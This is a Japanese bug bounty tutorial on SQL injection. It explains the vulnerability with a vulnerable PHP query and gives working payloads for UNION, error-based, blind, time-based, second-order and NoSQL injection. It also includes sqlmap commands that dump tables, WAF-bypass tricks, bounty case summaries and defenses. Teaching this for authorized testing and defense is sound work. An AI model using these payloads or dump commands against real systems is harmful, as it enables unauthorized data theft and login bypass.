SQL Injection (SQLi)

アプリケーションのデータベースクエリにユーザー入力を注入し、 データ漏洩・改ざん・認証バイパス・RCE を実現する古典的だが依然として致命的な脆弱性。

Theory WSA Lab Hands-on Case Study

原理と仕組み

SQL Injection は、アプリケーションがユーザー入力をSQL文に直接連結する際に発生する。 攻撃者はクエリの構文を壊し、任意のSQL文を実行させる。 

// 脆弱なコード (PHP)
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "' AND password = '" . $_GET['pass'] . "'";

// 攻撃入力: user = admin'--
// 結果のクエリ:
SELECT * FROM users WHERE username = 'admin'--' AND password = ''
// パスワードチェックがコメントアウトされ、admin でログイン成功
BB における SQLi の価値

SQLi は Critical〜High 評価が一般的。データベース全体の読み取り、管理者権限の奪取、 場合によっては xp_cmdshell (MSSQL) や LOAD_FILE / INTO OUTFILE (MySQL) による RCE まで到達可能。

種類と分類

1. UNION-based SQLi

UNION SELECT を利用して追加のクエリ結果をレスポンスに含ませる。 レスポンスにデータが表示される場合に有効。 

// カラム数の特定
' ORDER BY 1-- (成功)
' ORDER BY 2-- (成功)
' ORDER BY 3-- (エラー) → カラム数は 2

// データ抽出
' UNION SELECT username, password FROM users--
' UNION SELECT NULL, table_name FROM information_schema.tables--

2. Error-based SQLi

データベースのエラーメッセージを利用してデータを抽出する。 

// MySQL
' AND extractvalue(1, concat(0x7e, (SELECT version())))--
// 出力: XPATH syntax error: '~8.0.32'

// MSSQL
' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users))--

3. Blind SQLi (Boolean-based)

レスポンスの差異（ページ内容やステータスコードの変化）からデータを1ビットずつ推測する。 

// True condition → 正常ページ表示
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--

// False condition → 異なるレスポンス
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--

4. Blind SQLi (Time-based)

レスポンス時間の遅延でデータを推測。レスポンスに一切差異がない場合に使用。 

// MySQL
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0)--

// PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

// MSSQL
'; IF (SELECT SUBSTRING(username,1,1) FROM users)='a' WAITFOR DELAY '0:0:5'--

5. Second-order SQLi

入力はまず安全に保存されるが、別の機能でそのデータがクエリに使われる際に SQLi が発火する。テスト困難だが見逃されやすい。 

// 登録時: username = admin'-- (安全にDBに保存される)
// パスワード変更時:
UPDATE users SET password='newpass' WHERE username='admin'--'
// admin のパスワードが変更される

6. NoSQL Injection

MongoDB, CouchDB 等の NoSQL データベースに対するインジェクション。 ORM (Mongoose, Sequelize) を使用していても安全とは限らない。 

// MongoDB operator injection
POST /login
{"username": {"$gt": ""}, "password": {"$gt": ""}}
// 全ユーザーのうち最初のドキュメントでログイン

// Mongoose での脆弱パターン
User.find({username: req.body.username, password: req.body.password});
// req.body.password = {"$ne": ""} → パスワードが空でないユーザーを全取得

// $regex による情報抽出
{"username": "admin", "password": {"$regex": "^a"}}

検出方法

手動テスト

テスト入力期待される反応
シングルクォート'SQL エラー or 挙動変化
論理テスト' OR 1=1-- / ' OR 1=2--レスポンスの差異
Time delay' AND SLEEP(5)--5秒の遅延
UNION カラム数' ORDER BY N--N で エラー境界を特定
算術id=1-0 vs id=1同じ結果 = 数値注入可能

sqlmap の使い方

# 基本スキャン
sqlmap -u "https://target.com/page?id=1" --batch

# POST パラメータ
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" -p user

# Cookie / Header ベース
sqlmap -u "https://target.com/api" --cookie="session=abc" --headers="X-Token: xyz"

# データベース列挙
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump

# テクニック指定 (T=Time, B=Boolean, U=Union, E=Error)
sqlmap -u "https://target.com/page?id=1" --technique=T --time-sec=5

# WAF バイパス
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between
BB での sqlmap 使用注意

多くのプログラムで sqlmap の自動スキャンは 禁止または推奨されない。 手動で SQLi を確認してから、データ抽出の PoC として使用するのが安全。 Rate limit 超過でBANされるリスクもある。

防御と Bypass

主な防御手法

  • Parameterized Queries (Prepared Statements) - 最も効果的
  • ORM の使用 - ただし raw query や operator injection に注意
  • 入力バリデーション - ホワイトリスト方式
  • WAF - バイパス可能だがレイヤード防御として有効

WAF Bypass テクニック

// スペースの代替
/**/  →  SELECT/**/username/**/FROM/**/users
%09 (tab), %0a (newline), %0d (CR)

// キーワードの難読化
SeLeCt, SELE%43T, /*!50000SELECT*/

// UNION フィルタ回避
UNI%4FN, UN/**/ION, /*!UNION*/

// 関数の代替
SUBSTRING → MID, SUBSTR
ASCII → ORD
CONCAT → CONCAT_WS, GROUP_CONCAT

// エンコーディング
Hex: 0x61646d696e = 'admin'
Double URL encode: %2527 → %27 → '

Real-World Reports

#383127 - Valve: SQL Injection in report_xml.php through countryFilter[]

Bounty: $25,000 | Upvotes: 397

Valve の Steam パートナーシステムでの SQLi。在庫管理機能のパラメータに注入可能で、 パートナーの機密データやゲームキーの情報にアクセス可能だった。

  • Classic parameter injection in an authenticated endpoint
  • 高額報奨金の理由: パートナーの金銭的データへの直接アクセス
#868436 - Mail.ru (city-mobil.ru): Time-Based SQL Injection

Bounty: $15,000 | Upvotes: 631

Time-based Blind SQLi で、レスポンスに直接データが表示されないケース。 SLEEP ベースの遅延で1文字ずつデータを抽出。根気のいる検出だが高評価。

  • Blind SQLi でも Critical 評価を得られる好例
  • 重要: PoC でデータ抽出まで実演すると評価が上がる
報奨金分析

SQLi の報奨金は一般的に $5,000〜$25,000+。 金額を左右する要素: (1) アクセス可能なデータの機密性、(2) RCE への escalation 可否、 (3) 影響を受けるユーザー数、(4) 認証の有無（未認証 SQLi は最高評価）。

Key Takeaways

  • 入力ポイントを広く探す: URL パラメータだけでなく、Cookie、HTTP ヘッダー、JSON body も対象
  • Blind SQLi を見逃さない: レスポンスに変化がなくても time-based で検出可能
  • NoSQL も忘れない: MongoDB の operator injection は現代の Web アプリで頻出
  • Second-order を意識する: 入力時ではなく、使用時に発火するパターン
  • PoC の質: alert(1) 相当ではなく、実データ抽出まで示す
